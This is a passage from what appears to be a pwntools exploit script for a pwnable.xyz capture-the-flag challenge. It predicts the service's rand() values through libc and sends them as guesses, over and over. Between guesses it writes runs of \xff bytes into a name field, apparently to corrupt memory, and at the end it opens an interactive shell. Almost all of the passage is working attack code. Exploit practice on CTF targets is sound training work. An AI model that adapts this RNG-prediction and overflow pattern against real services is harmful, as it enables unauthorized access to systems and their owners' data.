    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()
    
    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)
    
    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x30)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x32)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()
    
    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)
    
    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()
    
    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x30)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x31)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()
    
    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x30)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)
    
    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x30)


    r.sendlineafter(">",str(10))
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("svc.pwnable.xyz", 30024)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
